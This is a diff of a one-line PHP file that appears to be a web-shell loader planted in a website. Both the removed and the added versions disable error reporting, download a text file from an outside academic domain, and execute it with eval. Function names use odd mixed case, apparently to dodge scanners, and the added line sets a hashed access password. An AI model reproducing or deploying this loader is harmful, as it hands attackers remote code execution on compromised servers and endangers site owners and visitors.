@@ -1,1 +1,1 @@
-<?php eRrOr_rEpOrTiNg(0);sEt_tImE_LiMiT(0);$id = cuRl_iNIt();cUrL_SeToPt($id, CURLOPT_URL, "https://adm-stiabagasasi.ac.id/kucing_ireng/g0t0/ooosaaassfiiixx.txt");cUrL_SeToPt($id, CURLOPT_RETURNTRANSFER, 1);$news = cUrL_ExEc($id);cUrL_ClOsE($id);eVaL("?>".$news);?>
+<?php eRrOr_rEpOrTiNg(0);sEt_tImE_LiMiT(0);$auth_pass = "8a15e72fdab7ded1e2daa2566109748e";$id = cuRl_iNIt();cUrL_SeToPt($id, CURLOPT_URL, "https://adm-stiabagasasi.ac.id/kucing_ireng/g0t0/ooosaaassfiiixx.txt");cUrL_SeToPt($id, CURLOPT_RETURNTRANSFER, 1);$news = cUrL_ExEc($id);cUrL_ClOsE($id);eVaL("?>".$news);?>
